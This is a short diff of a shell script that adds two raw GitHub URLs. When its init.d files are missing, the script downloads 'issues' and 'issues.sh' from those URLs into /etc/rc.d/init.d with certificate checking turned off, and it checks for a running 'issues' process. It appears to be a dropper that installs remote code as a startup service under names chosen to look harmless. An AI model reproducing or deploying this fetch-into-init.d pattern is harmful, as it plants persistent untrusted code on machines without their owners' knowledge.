@@ -4,8 +4,8 @@
 file1="/etc/rc.d/init.d/issuer"
 file2="/etc/rc.d/init.d/issues.sh"
 num1=$(ps -ef | grep issues | wc -l)
-url1=""
-url2=""
+url1="https://raw.githubusercontent.com/0x594/test/main/issues"
+url2="https://raw.githubusercontent.com/0x594/test/main/issues.sh"
 if [ ! -f "$file1" ]; then
   wget -P "$file1" --no-check-certificate $url1 -O issues
   wget -P "$file2" --no-check-certificate $url2 -O issues.sh
